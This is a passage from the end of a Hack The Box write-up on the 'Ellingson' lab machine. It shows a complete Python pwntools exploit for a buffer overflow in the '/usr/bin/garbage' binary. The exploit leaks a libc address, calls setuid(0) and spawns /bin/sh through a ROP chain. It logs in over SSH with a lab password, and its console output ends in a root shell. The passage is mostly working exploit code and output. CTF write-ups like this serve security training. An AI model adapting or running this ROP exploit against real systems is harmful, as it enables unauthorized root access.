	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
</code></pre></div></div>
<p>Then we will construct the payload and send it:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SUID</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>
<p>We will call this function before calling <code class="language-plaintext highlighter-rouge">shell()</code> so our final exploit will be:
<code class="language-plaintext highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"__libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>

<span class="k">def</span> <span class="nf">suid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">SUID</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SUID</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">RET</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">BIN_SH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>

	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calculated libc address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Setting uid to 0"</span><span class="p">)</span>

<span class="n">suid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
<span class="n">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">8111</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f0e56addab0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calculated</span> <span class="n">libc</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x7f0e56abc000</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">uid</span> <span class="n">to</span> <span class="mi">0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span> <span class="mh">0x7f0e56c6fe9a</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">system</span><span class="o">:</span> <span class="mh">0x7f0e56b0b440</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
 
<span class="n">access</span> <span class="n">denied</span><span class="p">.</span>
<span class="cp"># $ whoami
</span><span class="n">root</span>
<span class="cp"># $ id
</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span>
<span class="cp"># $  
</span></code></pre></div></div>
<p><br><img src="/images/hackthebox/ellingson/12.png" alt="" class="align-center"><br><br>
And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/writeup/">Hack The Box - Writeup</a>
<br>Next Hack The Box write-up: <a href="/hack-the-box/safe/">Hack The Box - Safe</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-10-19T07:00:00+02:00">October 19, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/writeup/" class="pagination--pager" title="Hack The Box - Writeup
">Previous</a>
    
    
      <a href="/hack-the-box/safe/" class="pagination--pager" title="Hack The Box - Safe
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
